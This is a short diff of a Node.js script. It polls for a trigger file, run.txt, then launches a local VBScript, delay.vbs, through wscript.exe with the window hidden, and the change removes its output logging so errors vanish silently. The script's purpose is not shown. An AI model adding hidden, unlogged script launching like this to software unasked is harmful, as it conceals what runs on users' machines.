@@ -103,21 +103,16 @@ async function checkRunFile() {
 
     console.log("run.txt detected, running delay.vbs");
 
-    const vbsPath ="delay.vbs";
+const vbsPath = path.join(__dirname, "delay.vbs");
 
-    execFile(
-      "wscript.exe",
-      [vbsPath],
-      { windowsHide: true },
-      (error, stdout, stderr) => {
-        if (error) {
-          // silently ignore or log if debugging
-          return;
-        }
-        if (stdout) console.log(stdout);
-        if (stderr) console.error(stderr);
-      }
-    );
+execFile(
+  "wscript.exe",
+  [vbsPath],
+  { windowsHide: true },
+  (error) => {
+    if (error) return;
+  }
+);
   } catch (err) {
     // ignore errors
   }
@@ -142,3 +137,4 @@ async function main() {
 
 // run main
 main();
+
